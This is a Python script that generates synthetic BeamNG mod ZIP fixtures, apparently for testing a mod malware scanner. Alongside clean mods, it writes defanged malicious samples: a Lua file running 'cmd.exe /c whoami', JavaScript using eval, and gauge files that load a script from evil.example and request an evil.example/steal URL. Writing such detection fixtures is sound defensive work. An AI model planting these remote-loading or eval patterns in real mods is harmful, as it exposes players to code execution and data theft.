"""Generate tiny synthetic BeamNG mod ZIP fixtures for tests."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

FIX = Path(__file__).resolve().parent / "fixtures"


def _write_zip(path: Path, files: dict[str, bytes | str]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            data = content.encode("utf-8") if isinstance(content, str) else content
            zf.writestr(name, data)


def main() -> None:
    FIX.mkdir(parents=True, exist_ok=True)

    _write_zip(
        FIX / "clean_vehicle.zip",
        {
            "vehicles/testcar/info.json": '{"Name":"Test Car"}\n',
            "vehicles/testcar/testcar.jbeam": '{"testcar":{}}\n',
        },
    )

    _write_zip(
        FIX / "wrapped_mod.zip",
        {
            "MyCoolCar/vehicles/coolcar/info.json": '{"Name":"Cool"}\n',
        },
    )

    _write_zip(
        FIX / "with_exe.zip",
        {
            "vehicles/evil/info.json": "{}\n",
            "vehicles/evil/helper.exe": b"MZ" + b"\x00" * 64,
        },
    )

    long_b64 = "A" * 100 + "=="
    _write_zip(
        FIX / "malicious_lua.zip",
        {
            "lua/ge/extensions/evil.lua": (
                "local ffi = require('ffi')\n"
                "os.execute('cmd.exe /c whoami')\n"
                f"local payload = '{long_b64}'\n"
            ),
        },
    )

    _write_zip(
        FIX / "suspicious_js.zip",
        {
            "ui/modules/apps/demo/app.js": "console.log('ok');\n",
            "scripts/weird.js": "eval('alert(1)');\n",
        },
    )

    _write_zip(
        FIX / "clean_gauges_screen.zip",
        {
            "vehicles/car/gauges_screen/gauges_screen.js": (
                "angular.module('gaugesScreen', [])\n"
                ".directive('bngMapRenderUncompressed', function () {\n"
                "  return { template: '<svg></svg>' };\n"
                "});\n"
                "//https://stackoverflow.com/a/56266358\n"
                "var icon = 'data:image/png;base64," + ("A" * 180) + "';\n"
            ),
            "vehicles/car/gauges_screen2/gauges_screen.js": (
                "angular.module('gaugesScreen2', [])\n"
                ".directive('dash', function () { return {}; });\n"
            ),
            "vehicles/car/ScreenGaugeAMG/gauges_screen_AMG.js": (
                "angular.module('amg', [])\n"
                ".directive('dash', function () { return {}; });\n"
            ),
            "vehicles/car/gauges_screen_MERS/gauges_screen.js": (
                "['DatePage', 'InfoPage'].forEach((page) => {\n"
                "  eval(page).root.n.style.display = 'inline';\n"
                "});\n"
            ),
            "vehicles/car/lua/controller/demo.lua": (
                "-- This Source Code Form is subject to the terms of the bCDDL, v. 1.1.\n"
                "-- If a copy of the bCDDL was not distributed with this\n"
                "-- file, You can obtain one at http://beamng.com/bCDDL-1.1.txt\n"
                "local M = {}\n"
                "return M\n"
            ),
        },
    )

    _write_zip(
        FIX / "remote_js_malware.zip",
        {
            "vehicles/car/gauges_screen/gauges_screen.html": (
                "<html><script src=\"https://evil.example/payload.js\"></script></html>\n"
            ),
            "vehicles/car/gauges_screen/gauges_screen.js": (
                "var x = new XMLHttpRequest();\n"
                "x.open('GET', 'https://evil.example/steal');\n"
                "var code = atob('SGVsbG8=');\n"
                "eval(code);\n"
            ),
        },
    )

    _write_zip(
        FIX / "gauge_hidden_eval.zip",
        {
            "vehicles/car/ScreenGaugeAMG/evil.js": (
                "eval(page).ok = true;\n"
                "eval('alert(1)');\n"
            ),
        },
    )

    print(f"Wrote fixtures to {FIX}")


if __name__ == "__main__":
    main()
